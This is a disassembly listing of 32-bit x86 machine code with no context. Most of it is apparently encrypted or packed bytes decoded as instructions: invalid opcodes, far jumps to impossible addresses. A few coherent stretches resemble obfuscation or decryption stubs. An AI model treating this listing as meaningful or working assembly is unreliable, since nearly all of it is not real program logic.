  40b569:	adc    esi,DWORD PTR [ebp-0x6f9cb8c7]
  40b56f:	xchg   ebx,eax
  40b570:	mov    gs,WORD PTR [ebp-0x52]
  40b573:	push   ebp
  40b574:	sub    al,0xa7
  40b576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b577:	inc    ebx
  40b578:	pop    eax
  40b579:	mov    gs,WORD PTR [eax-0x1a]
  40b57c:	int    0xd5
  40b57e:	(bad)  
  40b57f:	call   0x148a1aab
  40b584:	xlat   BYTE PTR ds:[ebx]
  40b585:	sbb    al,0x7e
  40b587:	or     BYTE PTR [eax],bh
  40b589:	dec    esp
  40b58a:	adc    DWORD PTR [edi+0x7e],esi
  40b58d:	xchg   edx,eax
  40b58e:	xor    bl,al
  40b590:	pop    es
  40b591:	scas   eax,DWORD PTR es:[edi]
  40b592:	add    ah,cl
  40b594:	fcomi  st,st(2)
  40b596:	push   ecx
  40b597:	ins    DWORD PTR es:[edi],dx
  40b598:	and    ebp,edx
  40b59a:	(bad)  
  40b59b:	mov    edi,0xf378c280
  40b5a0:	cmp    dh,BYTE PTR [ebx]
  40b5a2:	or     ecx,DWORD PTR [esi-0x3b7e4ca7]
  40b5a8:	gs or  ah,al
  40b5ab:	sbb    eax,0x8b8f1326
  40b5b0:	jge    0x40b5db
  40b5b2:	pop    ss
  40b5b3:	adc    eax,DWORD PTR [edx]
  40b5b5:	repnz clc 
  40b5b7:	inc    esi
  40b5b8:	fld    QWORD PTR [edi-0x35]
  40b5bb:	in     eax,dx
  40b5bc:	mov    edx,0xbfec19b2
  40b5c1:	call   0x178c:0x2b02a2b3
  40b5c8:	repz out dx,eax
  40b5ca:	fild   DWORD PTR [esi]
  40b5cc:	clc    
  40b5cd:	(bad)  
  40b5ce:	jp     0x40b5f6
  40b5d0:	aad    0x14
  40b5d2:	std    
  40b5d3:	mov    BYTE PTR [ebp+0x28],cl
  40b5d6:	xchg   edi,eax
  40b5d7:	mov    esi,0xf2ddc3cf
  40b5dc:	sbb    BYTE PTR [ebx-0x53],cl
  40b5df:	int3   
  40b5e0:	ror    BYTE PTR [edi],cl
  40b5e2:	inc    esi
  40b5e3:	fild   WORD PTR [esi+eiz*4-0x55]
  40b5e7:	pop    ss
  40b5e8:	mov    cl,0x9b
  40b5ea:	lods   al,BYTE PTR ds:[esi]
  40b5eb:	fmulp  st(6),st
  40b5ed:	stos   BYTE PTR es:[edi],al
  40b5ee:	jns    0x40b669
  40b5f0:	jo     0x40b629
  40b5f2:	adc    BYTE PTR [eax-0x2a39de1c],0x66
  40b5f9:	xchg   DWORD PTR [ecx+0x546afe2c],eax
  40b5ff:	mov    ds,WORD PTR [ebx]
  40b601:	(bad)  
  40b602:	int3   
  40b603:	cmp    eax,0x9ecbade4
  40b608:	fistp  WORD PTR [ecx+0x7f]
  40b60b:	xor    eax,DWORD PTR [edi]
  40b60d:	mov    DWORD PTR [edx+0x786442af],ecx
  40b613:	iret   
  40b614:	test   eax,0xe3443110
  40b619:	(bad)  
  40b61a:	inc    esp
  40b61b:	nop
  40b61c:	jmp    0x7244:0xb9befce3
  40b623:	(bad)  
  40b624:	mov    ds:0xab674849,al
  40b629:	push   ebx
  40b62a:	in     eax,dx
  40b62b:	xchg   DWORD PTR [ecx+0x55],eax
  40b62e:	js     0x40b5e2
  40b630:	mov    al,ds:0x60b0c7c5
  40b635:	jg     0x40b692
  40b637:	push   ebx
  40b638:	fcom   DWORD PTR [edx+0x3]
  40b63b:	pop    es
  40b63c:	out    0x87,al
  40b63e:	push   ebp
  40b63f:	aaa    
  40b640:	loopne 0x40b618
  40b642:	jmp    0xdfc4034e
  40b647:	ror    BYTE PTR [eax],0xfb
  40b64a:	adc    bh,0x33
  40b64d:	push   cs
  40b64e:	scas   al,BYTE PTR es:[edi]
  40b64f:	ja     0x40b686
  40b651:	dec    esp
  40b652:	test   BYTE PTR [ebp-0x3c],dh
  40b655:	repz mov edi,0xdf95591a
  40b65b:	daa    
  40b65c:	cmp    eax,0xa7244752
  40b661:	mov    esi,0x66e14bdf
  40b666:	mov    dl,BYTE PTR [esi+0x488829c2]
  40b66c:	in     eax,dx
  40b66d:	int    0xd9
  40b66f:	inc    ebx
  40b670:	push   esp
  40b671:	mov    ebp,DWORD PTR [edi-0x1b]
  40b674:	stos   DWORD PTR es:[edi],eax
  40b675:	(bad)  
  40b676:	and    DWORD PTR [edi-0x3a],ebp
  40b679:	mov    cl,dl
  40b67b:	pop    es
  40b67c:	adc    esi,DWORD PTR [eax+0x11]
  40b67f:	pop    ss
  40b680:	add    ah,BYTE PTR [ebp+edx*8-0x618f00fb]
  40b687:	repz loop 0x40b624
  40b68a:	push   edi
  40b68b:	stos   BYTE PTR es:[edi],al
  40b68c:	ins    BYTE PTR es:[edi],dx
  40b68d:	jns    0x40b68f
  40b68f:	mov    ds:0x507efb46,eax
  40b694:	retf   0x3be2
  40b697:	lock cmp BYTE PTR [ebp+0x45b47684],0x47
  40b69f:	pop    ss
  40b6a0:	mov    esp,0x118f0791
  40b6a5:	pop    es
  40b6a6:	adc    eax,0x72f2da2c
  40b6ab:	adc    eax,0x32b971de
  40b6b0:	mov    eax,DWORD PTR [ebp-0x10]
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0xe5
  40b6da:	xchg   edi,eax
  40b6db:	push   ebx
  40b6dc:	pop    ss
  40b6dd:	fptan  
  40b6df:	jle    0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b6f8
  40b6e6:	mov    al,0xe
  40b6e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6e9:	push   cs
  40b6ea:	es mov al,0x27
  40b6ed:	in     al,dx
  40b6ee:	out    dx,eax
  40b6ef:	sub    esp,DWORD PTR [edx]
  40b6f1:	test   DWORD PTR [ecx+0x2f],esi
  40b6f4:	push   ebp
  40b6f5:	mov    bl,0xd1
  40b6f7:	call   0xd81f:0x7f0bba87
  40b6fe:	push   edi
  40b6ff:	ins    BYTE PTR es:[edi],dx
  40b700:	jb     0xc329e0d
  40b706:	sub    esp,ecx
  40b708:	and    bl,BYTE PTR [edi-0x7e]
  40b70b:	cmc    
  40b70c:	ret    0xd6a
  40b70f:	xor    al,0xa3
  40b711:	cmp    eax,0x210c0211
  40b716:	(bad)  
  40b717:	fistp  QWORD PTR [edx+eiz*1]
  40b71a:	popa   
  40b71b:	pusha  
  40b71c:	pop    DWORD PTR [ebx]
  40b71e:	int    0xc8
  40b720:	(bad)  
  40b721:	sbb    eax,0x50e3e1fa
  40b726:	out    0xf7,eax
  40b728:	mov    ds,WORD PTR [esi-0x3c5c0223]
  40b72e:	xlat   BYTE PTR ds:[ebx]
  40b72f:	push   cs
  40b730:	stc    
  40b731:	shl    bl,1
  40b733:	dec    eax
  40b734:	xchg   edx,eax
  40b735:	or     al,0x42
  40b737:	dec    eax
  40b738:	popa   
  40b739:	mov    ds:0xfbf359f5,eax
  40b73e:	(bad)  
  40b73f:	(bad)  
  40b740:	mov    edx,0x1100b322
  40b745:	mov    ch,BYTE PTR [ebp+0x2f52ccff]
  40b74b:	adc    bl,BYTE PTR [esi+0x4a]
  40b74e:	fsub   st,st(5)
  40b750:	mov    al,0xfa
  40b752:	dec    esi
  40b753:	iret   
  40b754:	int3   
  40b755:	sub    ch,BYTE PTR [esi+0x2131a27]
  40b75b:	pop    esi
  40b75c:	aas    
  40b75d:	inc    edi
  40b75e:	push   esp
  40b75f:	into   
  40b760:	jmp    0x29295df
  40b765:	cwde   
  40b766:	int3   
  40b767:	test   DWORD PTR [edx+edx*1-0x4e1df74],ecx
  40b76e:	dec    ebp
  40b76f:	fbld   TBYTE PTR [edx-0x3b373e23]
  40b775:	leave  
  40b776:	mov    al,ds:0x25fd9bfc
  40b77b:	(bad)  
  40b77c:	int    0xaa
  40b77e:	jge    0x40b73c
  40b780:	xor    DWORD PTR [ecx+0x27],esp
  40b783:	lds    ebx,FWORD PTR [edx+0x7c944ef]
  40b789:	mov    cl,0xf2
  40b78b:	cld    
  40b78c:	fidiv  DWORD PTR ds:0xb1fd1038
  40b792:	jmp    0xc18dde17
  40b797:	mov    ds,WORD PTR [ebx+0x31e523a6]
  40b79d:	push   cs
  40b79e:	fst    QWORD PTR [eax+0x29647788]
  40b7a4:	fisub  WORD PTR fs:[eax]
  40b7a7:	inc    edi
  40b7a8:	imul   esi,ecx,0xfb38de44
  40b7ae:	jno    0x40b793
  40b7b0:	mov    ah,BYTE PTR [eax-0x27da0b22]
  40b7b6:	test   DWORD PTR es:[edi],0xc68ff0f3
  40b7bd:	xor    DWORD PTR [esp+ecx*8-0x7f],ecx
  40b7c1:	dec    ebx
  40b7c2:	push   edi
  40b7c3:	or     DWORD PTR [ecx+0x59a9eca4],esi
  40b7c9:	add    dl,bl
  40b7cb:	std    
  40b7cc:	xor    DWORD PTR [eax-0x77],esi
  40b7cf:	(bad)  
  40b7d0:	mov    ds:0xd240e1e6,eax
  40b7d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7d6:	dec    ebp
  40b7d7:	sahf   
  40b7d8:	add    al,BYTE PTR [eax]
  40b7da:	test   DWORD PTR [edx],0xbee0476c
  40b7e0:	mov    ecx,0xf611223f
  40b7e5:	dec    edi
  40b7e6:	fs push eax
  40b7e8:	adc    ebx,DWORD PTR [edx+0x49037e37]
  40b7ee:	out    dx,eax
  40b7ef:	cld    
  40b7f0:	mov    ecx,0xf29e4550
  40b7f5:	push   edx
  40b7f6:	jne    0x40b7d2
  40b7f8:	jae    0x40b7de
  40b7fa:	add    al,0x72
  40b7fc:	fiadd  DWORD PTR [ebx+0x42694d8]
  40b802:	inc    esi
  40b803:	repnz das 
  40b805:	gs aaa 
  40b807:	inc    esp
  40b808:	mov    ch,0x3f
  40b80a:	push   ds
  40b80b:	lds    ebx,FWORD PTR [esi-0x38]
  40b80e:	fisttp WORD PTR [esi]
  40b810:	cmp    DWORD PTR [edx-0x20c9c1a8],esp
  40b816:	data16 clc 
  40b818:	fs and dh,bl
  40b81b:	dec    edi
  40b81c:	fist   WORD PTR [esi+eax*4-0x5c]
  40b820:	scas   al,BYTE PTR es:[edi]
  40b821:	loope  0x40b7fc
  40b823:	dec    eax
  40b824:	xor    BYTE PTR [ecx],0x55
  40b827:	pusha  
  40b828:	mov    bh,0x48
  40b82a:	add    BYTE PTR [edi+0x15],dl
  40b82d:	mov    ch,0x94
  40b82f:	sbb    al,0x53
  40b831:	pop    esp
  40b832:	mov    bh,0xf1
  40b834:	or     BYTE PTR [ecx+0x5cbe202d],dl
  40b83a:	and    dh,BYTE PTR [edi+0x1aa39ab0]
  40b840:	js     0x40b879
  40b842:	mov    esi,0x77b763e3
  40b847:	mov    ds:0xaa5dfe78,al
  40b84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b84d:	lods   eax,DWORD PTR ds:[esi]
  40b84e:	outs   dx,DWORD PTR ds:[esi]
  40b84f:	inc    ecx
  40b850:	test   al,0xca
  40b852:	pop    ecx
  40b853:	and    eax,0xb9518b1f
  40b858:	dec    ebp
  40b859:	pop    edx
  40b85a:	ret    
  40b85b:	jo     0x40b7f9
  40b85d:	push   ds
  40b85e:	out    0x90,al
  40b860:	adc    BYTE PTR [edi],ch
  40b862:	jg     0x40b8d8
  40b864:	je     0x40b8d6
  40b866:	in     al,dx
  40b867:	xchg   ebx,eax
  40b868:	mov    ebp,DWORD PTR [edx+0x1d]
  40b86b:	dec    edx
  40b86c:	cli    
  40b86d:	or     eax,0x9bbc2eb5
  40b872:	and    BYTE PTR [eax-0x5cc2a236],al
  40b878:	pop    esi
  40b879:	nop
  40b87a:	data16 or BYTE PTR [ebp+0x76],bl
  40b87e:	mov    edi,0x1a9f413f
  40b883:	dec    esi
  40b884:	iret   
  40b885:	push   0xcd75ea7
  40b88a:	mov    DWORD PTR [esi+0x7efa179d],ecx
  40b890:	nop
  40b891:	adc    al,0xac
  40b893:	(bad)  
  40b894:	daa    
  40b895:	call   0x32bb:0x7962c20
  40b89c:	or     bh,BYTE PTR [ecx+0x16627ee1]
  40b8a2:	ja     0x40b8c9
  40b8a4:	ficomp DWORD PTR [ebp-0x4bf751bf]
  40b8aa:	inc    edx
  40b8ab:	mov    eax,ds:0x4d37e301
  40b8b0:	inc    esp
  40b8b1:	sub    bh,BYTE PTR [edi+0x665832b0]
  40b8b7:	adc    eax,0x339d072c
  40b8bc:	and    BYTE PTR [eax+0x5aa4d62f],ah
  40b8c2:	add    dl,BYTE PTR [ebp+0x1f]
  40b8c5:	(bad)  [esi]
  40b8c7:	mov    WORD PTR ds:0x6a3799dd,gs
  40b8cd:	(bad)  
  40b8ce:	and    DWORD PTR [edi],ecx
  40b8d0:	add    esp,DWORD PTR [eax+0x7067a7c0]
  40b8d6:	sub    al,0x45
  40b8d8:	mov    eax,0x1b2aa757
  40b8dd:	jmp    0x3aabf252
  40b8e2:	popf   
  40b8e3:	xchg   esp,eax
  40b8e4:	sub    eax,ebp
  40b8e6:	pop    edi
  40b8e7:	sub    BYTE PTR [edi+0x7d],dl
  40b8ea:	xor    eax,esi
  40b8ec:	adc    ebx,edi
  40b8ee:	(bad)  
  40b8ef:	repnz add DWORD PTR [ebp+eax*8+0x3b],esp
  40b8f4:	push   ecx
  40b8f5:	pop    ecx
  40b8f6:	cmp    DWORD PTR [edx],0x4c
  40b8f9:	call   0x43b1:0x1a024676
  40b900:	pop    es
  40b901:	out    0x37,eax
  40b903:	mov    ebp,0x360f6308
  40b908:	jecxz  0x40b906
  40b90a:	push   0x18597247
  40b90f:	leave  
  40b910:	fisubr WORD PTR [ebx+ebx*1]
  40b913:	cli    
  40b914:	imul   esp,DWORD PTR [ebx+0x12],0xc4b4cf9f
  40b91b:	stos   BYTE PTR es:[edi],al
  40b91c:	popa   
  40b91d:	in     eax,0x17
  40b91f:	cmp    DWORD PTR [ecx+0x5f58584e],esi
  40b925:	push   ds
  40b926:	xchg   edx,eax
  40b927:	adc    BYTE PTR [edi+0xfa4ec49],dl
  40b92d:	cmp    al,BYTE PTR [ebx+0x2b]
  40b930:	lods   al,BYTE PTR ds:[esi]
  40b931:	gs (bad) 
  40b933:	pop    edx
  40b934:	sub    BYTE PTR [edi],ch
  40b936:	push   es
  40b937:	pop    ecx
  40b938:	adc    DWORD PTR [ecx-0x54966ec7],esp
  40b93e:	xor    eax,0x98e89afe
  40b943:	push   es
  40b944:	pushf  
  40b945:	xchg   ecx,eax
  40b946:	js     0x40b95c
  40b948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b949:	pop    ds
  40b94a:	push   edi
  40b94b:	jg     0x40b947
  40b94d:	lods   eax,DWORD PTR ds:[esi]
  40b94e:	cs and eax,0xd4a4865
  40b954:	arpl   WORD PTR [ecx],cx
  40b956:	clc    
  40b957:	mov    DWORD PTR [eax+0x3c],esi
  40b95a:	js     0x40b938
  40b95c:	(bad)  
  40b95e:	dec    eax
  40b95f:	cmp    DWORD PTR [ecx+0x2ec5842c],edx
  40b965:	jno    0x40b9a4
  40b967:	adc    cl,bh
  40b969:	lock loope 0x40b94e
  40b96c:	gs cdq 
  40b96e:	add    eax,0x407ceb36
  40b973:	das    
  40b974:	pop    edx
  40b975:	ss and al,0x1e
  40b978:	or     dl,BYTE PTR [ebp+0x52bc2207]
  40b97e:	jnp    0x40b964
  40b980:	lds    edx,FWORD PTR [ecx+edx*4-0x1376feb8]
  40b987:	jmp    0x40b93e
  40b989:	add    eax,0x6a43cbb4
  40b98e:	stc    
  40b98f:	push   ecx
  40b990:	xor    al,0x74
  40b992:	fprem1 
  40b994:	inc    ebp
  40b995:	daa    
  40b996:	and    dl,0x5f
  40b999:	push   esp
  40b99a:	mov    ebp,0xfb1bdb80
  40b99f:	fisubr DWORD PTR [edi+0x5e]
  40b9a2:	jmp    0x40b93a
  40b9a4:	and    BYTE PTR [eax+ecx*4+0x738263e5],dh
  40b9ab:	add    DWORD PTR [eax],esi
  40b9ad:	sbb    eax,0x61512c84
  40b9b2:	sbb    al,0x54
  40b9b4:	inc    ebx
  40b9b5:	arpl   WORD PTR [ecx-0x3d],si
  40b9b8:	sar    BYTE PTR [ebp+0x3065d8c2],0xad
  40b9bf:	jne    0x40b94d
  40b9c1:	push   esi
  40b9c2:	cld    
  40b9c3:	pop    ecx
  40b9c4:	add    eax,DWORD PTR [edi+0x58909e35]
  40b9ca:	and    DWORD PTR [edi-0x273403f9],ebp
  40b9d0:	aam    0xe5
  40b9d2:	outs   dx,DWORD PTR ds:[esi]
  40b9d3:	es sti 
  40b9d5:	ja     0x40ba04
  40b9d7:	xchg   ebx,eax
  40b9d8:	mov    gs,WORD PTR [edx+0x1167e939]
  40b9de:	xchg   ecx,eax
  40b9df:	ja     0x40ba23
  40b9e1:	(bad)  
  40b9e2:	aad    0x88
  40b9e4:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9e6:	repnz sbb bh,ah
  40b9e9:	test   eax,0x3c41cc43
  40b9ee:	das    
  40b9ef:	repnz xor BYTE PTR [edi+edx*4],ch
  40b9f3:	inc    ebx
  40b9f4:	xchg   esp,eax
  40b9f5:	jne    0x40ba02
  40b9f7:	mov    al,ds:0x89a34cd0
  40b9fc:	jne    0x40b982
  40b9fe:	inc    edx
  40b9ff:	enter  0x9eb3,0xa1
  40ba03:	push   edx
  40ba04:	add    ah,ch
  40ba06:	inc    edi
  40ba07:	pop    esi
  40ba08:	push   ebp
  40ba09:	jp     0x40b9b5
  40ba0b:	jbe    0x40b9e6
  40ba0d:	imul   esi,DWORD PTR [edx+edi*8],0xffffffca
  40ba11:	aaa    
  40ba12:	sbb    al,0x12
  40ba14:	sub    BYTE PTR [esi-0x75],ah
  40ba17:	dec    ebp
  40ba18:	cld    
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	aam    0x2a
  40ba37:	and    al,0x21
  40ba39:	mov    ecx,esi
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba7e
  40ba42:	or     edi,DWORD PTR [edi-0x733e33bf]
  40ba48:	lock pop ebx
  40ba4a:	mov    eax,0x28b044ab
  40ba4f:	popa   
  40ba50:	push   ebp
  40ba51:	es inc ebp
  40ba53:	ss je  0x40b9f0
  40ba56:	ror    ecx,cl
  40ba58:	mov    ebx,0xf7ba7682
  40ba5d:	lock mov esi,ss
  40ba60:	xchg   esi,eax
  40ba61:	scas   al,BYTE PTR es:[edi]
  40ba62:	or     ch,BYTE PTR [ecx-0x3c2f6b7a]
  40ba68:	bound  ebx,QWORD PTR [ecx-0x58]
  40ba6b:	int    0xa3
  40ba6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6e:	fcomp  QWORD PTR [ebx+0x56]
  40ba71:	push   edx
  40ba72:	mov    ebx,0x4d4b724
  40ba77:	loopne 0x40ba49
  40ba79:	fsub   st(2),st
  40ba7b:	xchg   BYTE PTR [ecx-0x7c],cl
  40ba7e:	out    dx,eax
  40ba7f:	bound  ebp,QWORD PTR [ebp+0x36]
  40ba82:	mov    bh,0x3c
  40ba84:	jmp    0x5ef1:0xb68625d3
  40ba8b:	inc    ebp
  40ba8c:	(bad)  [eax-0x4ccab893]
  40ba92:	sub    dl,ah
  40ba94:	push   esp
  40ba95:	out    0x57,al
  40ba97:	punpcklbw mm2,DWORD PTR [ebx]
  40ba9a:	into   
  40ba9b:	aam    0x3a
  40ba9d:	mov    cl,0x50
  40ba9f:	in     al,dx
  40baa0:	adc    BYTE PTR [esi],bh
  40baa2:	stc    
  40baa3:	daa    
  40baa4:	lods   al,BYTE PTR ds:[esi]
  40baa5:	sub    esi,0xa6390b38
  40baab:	sahf   
  40baac:	outs   dx,DWORD PTR ds:[esi]
  40baad:	cmp    DWORD PTR [edi+0x1c16b5e6],esp
  40bab3:	inc    esi
  40bab4:	mov    fs,WORD PTR [ebx+0x3dee8ddf]
  40baba:	(bad)  
  40babb:	out    dx,al
  40babc:	jno    0x40baf9
  40babe:	push   esp
  40babf:	inc    edi
  40bac0:	in     al,0x33
  40bac2:	leave  
  40bac3:	mov    WORD PTR [edi],fs
  40bac5:	push   ds
  40bac6:	sbb    eax,0x43c32678
  40bacb:	push   edx
  40bacc:	(bad)  
  40bacd:	iret   
  40bace:	das    
  40bacf:	jno    0x40bb3b
  40bad1:	mov    ebx,0xa1adf313
  40bad6:	mov    ds:0xc605b08,eax
  40badb:	cli    
  40badc:	jl     0x40bb02
  40bade:	inc    edi
  40badf:	ds stc 
  40bae1:	stc    
  40bae2:	test   eax,0x4acc32bd
  40bae7:	out    0xf4,eax
  40bae9:	jbe    0x40bb56
  40baeb:	leave  
  40baec:	xor    cl,bl
  40baee:	loope  0x40bb3d
  40baf0:	movups XMMWORD PTR [edi+0x60],xmm3
  40baf4:	adc    al,ch
  40baf6:	adc    bh,BYTE PTR [ebp+0x63]
  40baf9:	jge    0x40bb21
  40bafb:	adc    ah,dh
  40bafd:	gs loope 0x40ba9b
  40bb00:	push   ss
  40bb01:	add    DWORD PTR [edx],0x33
  40bb04:	and    bh,BYTE PTR [edx]
  40bb06:	pushf  
  40bb07:	aaa    
  40bb08:	adc    DWORD PTR [ebp+eiz*1-0x5d],edi
  40bb0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb0d:	dec    ebx
  40bb0e:	outs   dx,DWORD PTR ds:[esi]
  40bb0f:	shr    al,0xed
  40bb12:	push   ss
  40bb13:	pop    esp
  40bb14:	push   0xffffffae
  40bb16:	sbb    DWORD PTR [eax-0xf332084],0x19
  40bb1d:	fs push ebp
  40bb1f:	lahf   
  40bb20:	sbb    ch,cl
  40bb22:	jmp    0x40baec
  40bb24:	and    ch,BYTE PTR ds:0x5313389f
  40bb2a:	xor    bl,dh
  40bb2c:	jmp    0x7bc40105
  40bb31:	test   BYTE PTR [edx+0x30],ch
  40bb34:	aaa    
  40bb35:	cmp    ch,dl
  40bb37:	(bad)  
  40bb38:	in     al,dx
  40bb39:	rcr    BYTE PTR [eax-0x56],cl
  40bb3c:	(bad)  
  40bb3d:	(bad)  
  40bb3e:	loopne 0x40bac9
  40bb40:	das    
  40bb41:	mov    WORD PTR [edi+0x61],ds
  40bb44:	mov    ch,0x4d
  40bb46:	dec    edx
  40bb47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb49:	ret    0x8b02
  40bb4c:	adc    BYTE PTR [ebx],bh
  40bb4e:	jmp    0x40bbb4
  40bb50:	popa   
  40bb51:	adc    bl,cl
  40bb53:	pop    es
  40bb54:	repz jge 0x40bb60
  40bb57:	push   ds
  40bb58:	pop    esi
  40bb59:	ret    0x99df
  40bb5c:	cmp    cl,BYTE PTR [edi+ecx*1-0x46]
  40bb60:	in     al,0x1a
  40bb62:	les    esp,FWORD PTR [esi-0x44791a0c]
  40bb68:	sub    ebp,DWORD PTR [edi-0x3a80ffe9]
  40bb6e:	fisttp DWORD PTR [eax-0x1c]
  40bb71:	sub    edi,ebx
  40bb73:	mov    al,0xe1
  40bb75:	stos   BYTE PTR es:[edi],al
  40bb76:	add    al,BYTE PTR [esi]
  40bb78:	popf   
  40bb79:	adc    eax,0x14fae4c3
  40bb7e:	jmp    0x32b4fbc1
  40bb83:	add    al,0x80
  40bb85:	inc    edx
  40bb86:	jno    0x40bbd1
  40bb88:	xor    eax,0x9d4af4e3
  40bb8d:	retf   
  40bb8e:	push   0xffffff97
  40bb90:	adc    ebx,DWORD PTR [eax]
  40bb92:	stos   BYTE PTR es:[edi],al
  40bb93:	mov    ebx,0xbf645a3f
  40bb98:	jecxz  0x40bbee
  40bb9a:	dec    ebp
  40bb9b:	inc    esp
  40bb9c:	pop    esp
  40bb9d:	push   cs
  40bb9e:	pop    eax
  40bb9f:	icebp  
  40bba0:	xlat   BYTE PTR ds:[ebx]
  40bba1:	sar    DWORD PTR [edx-0x104d6bbd],cl
  40bba7:	dec    ecx
  40bba8:	call   0xec38:0xd08b38b9
  40bbaf:	pop    edi
  40bbb0:	mov    bh,0xc0
  40bbb2:	jb     0x40bb98
  40bbb4:	pop    eax
  40bbb5:	cli    
  40bbb6:	mov    ecx,0x772f85b4
  40bbbb:	fnsave [edi]
  40bbbd:	push   edi
  40bbbe:	leave  
  40bbbf:	shl    bl,1
  40bbc1:	popa   
  40bbc2:	mov    dl,0xf0
  40bbc4:	retf   0xca75
  40bbc7:	adc    DWORD PTR [ebx+0x77d903e9],edi
  40bbcd:	lds    esp,FWORD PTR [esi+0x1c]
  40bbd0:	cmp    ebx,esp
  40bbd2:	pop    edx
  40bbd3:	push   DWORD PTR [esi]
  40bbd5:	and    edx,ebx
  40bbd7:	jecxz  0x40bc00
  40bbd9:	sub    dh,bh
  40bbdb:	loop   0x40bc4e
  40bbdd:	sbb    ch,BYTE PTR [ebx-0x29e3513b]
  40bbe3:	push   edi
  40bbe4:	int    0xaa
  40bbe6:	push   es
  40bbe7:	ss push esi
  40bbe9:	imul   esp,DWORD PTR [edi-0x5c76f82b],0x46
  40bbf0:	int    0x37
  40bbf2:	xchg   ebx,eax
  40bbf3:	lds    edx,FWORD PTR [eax+0x45]
  40bbf6:	adc    al,0x41
  40bbf8:	ds dec edx
  40bbfa:	mov    ah,0x6
  40bbfc:	adc    BYTE PTR [ecx],cl
  40bbfe:	mov    ah,cl
  40bc00:	shr    DWORD PTR [esi+0x46648e7f],1
  40bc06:	add    ecx,DWORD PTR [ebp-0x256cb9bd]
  40bc0c:	add    DWORD PTR [edx+0x458eaf82],0xffffffae
  40bc13:	and    ah,bl
  40bc15:	sar    ebx,1
  40bc17:	lahf   
  40bc18:	sbb    al,0x48
  40bc1a:	or     BYTE PTR [edx-0x66d37395],cl
  40bc20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc21:	mov    ch,0x73
  40bc23:	call   0xa8c08da2
  40bc28:	(bad)  
  40bc29:	jecxz  0x40bc1d
  40bc2b:	xor    eax,0xf10e6ba9
  40bc30:	addr16 pusha 
  40bc32:	or     ecx,DWORD PTR [edx]
  40bc34:	cmc    
  40bc35:	(bad)  
  40bc37:	repnz sub edi,edi
  40bc3a:	mov    ebp,0x70d9863d
  40bc3f:	fld    QWORD PTR ds:0x8289df5e
  40bc45:	and    eax,0x2b350e9f
  40bc4a:	aaa    
  40bc4b:	nop
  40bc4c:	dec    esp
  40bc4d:	test   BYTE PTR [edx+ebx*4-0x1f53ec89],ch
  40bc54:	call   0xcc86:0x933c5886
  40bc5b:	pushf  
  40bc5c:	xor    esi,DWORD PTR [edi]
  40bc5e:	jns    0x40bc3e
  40bc60:	jmp    0x6b3aab93
  40bc65:	aam    0x1
  40bc67:	out    0x57,al
  40bc69:	add    BYTE PTR [edi+ebp*1],0x7a
  40bc6d:	sub    bh,ah
  40bc6f:	and    edx,DWORD PTR [esi+0x2317297f]
  40bc75:	lods   eax,DWORD PTR ds:[esi]
  40bc76:	leave  
  40bc77:	add    bl,bl
  40bc79:	hlt    
  40bc7a:	fiadd  WORD PTR [eax+0x1712ed00]
  40bc80:	xlat   BYTE PTR ds:[ebx]
  40bc81:	iret   
  40bc82:	lods   al,BYTE PTR ds:[esi]
  40bc83:	and    BYTE PTR fs:[ebx-0x1c],ch
  40bc87:	push   esi
  40bc88:	loop   0x40bc2f
  40bc8a:	cdq    
  40bc8b:	cwde   
  40bc8c:	jl     0x40bc54
  40bc8e:	mov    WORD PTR [eax+0x341b50c6],ds
  40bc94:	pop    eax
  40bc95:	mov    ds:0x6b3cbbe2,al
  40bc9a:	push   edi
  40bc9b:	mov    bl,0xe5
  40bc9d:	sub    al,0x72
  40bc9f:	xchg   ebp,eax
  40bca0:	mov    ebp,0x238604b8
  40bca5:	and    ebp,esi
  40bca7:	(bad)  
  40bca8:	xor    al,0xb0
  40bcaa:	ja     0x40bc47
  40bcac:	add    al,0x96
  40bcae:	mov    ds:0xcfbd7ef6,al
  40bcb3:	sub    DWORD PTR [esi],ecx
  40bcb5:	addr16 pop eax
  40bcb7:	push   eax
  40bcb8:	lds    edi,FWORD PTR [edi]
  40bcba:	add    ebp,ecx
  40bcbc:	or     dl,bh
  40bcbe:	push   esp
  40bcbf:	cmp    ch,BYTE PTR [eax+0x70]
  40bcc2:	out    0x9e,al
  40bcc4:	repz mov dl,0xee
  40bcc7:	inc    edi
  40bcc8:	cli    
  40bcc9:	imul   ebx,DWORD PTR [eax-0x28],0x32f3fd13
  40bcd0:	cmp    DWORD PTR [ebx+0x6fc2a26f],eax
  40bcd6:	or     ebp,esp
  40bcd8:	or     BYTE PTR [ecx],dh
  40bcda:	mov    eax,0xb4da41b9
  40bcdf:	or     DWORD PTR [esi-0x3f],0x3fed0dc4
